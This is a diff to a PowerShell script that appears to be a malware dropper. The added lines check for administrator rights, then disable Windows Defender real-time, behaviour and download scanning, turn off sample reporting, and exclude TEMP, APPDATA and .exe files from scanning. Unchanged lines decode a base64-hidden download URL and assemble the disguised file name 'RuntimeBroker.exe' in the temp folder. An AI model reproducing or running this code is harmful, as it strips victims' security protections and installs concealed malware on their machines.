@@ -1,6 +1,23 @@
 $ProgressPreference = 'SilentlyContinue'
 
-$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9fcGJ3cFRiaQ=='))
+# ── admin check + defender disable ──────────────────────────────────────
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if ($isAdmin) {
+    try {
+        Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionExtension ".exe" -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
+        Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
+    } catch {}
+}
+# ────────────────────────────────────────────────────────────────────────
+
+$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9hd2Vkc2FrbHNhcS5vbnJlbmRlci5jb20vZi9UWVRZaGk5Sg=='))
 $t=[IO.Path]::GetTempPath()
 $n=('R','u','n','t','i','m','e','B','r','o','k','e','r','.','e','x','e') -join ''
 $p=$t+$n
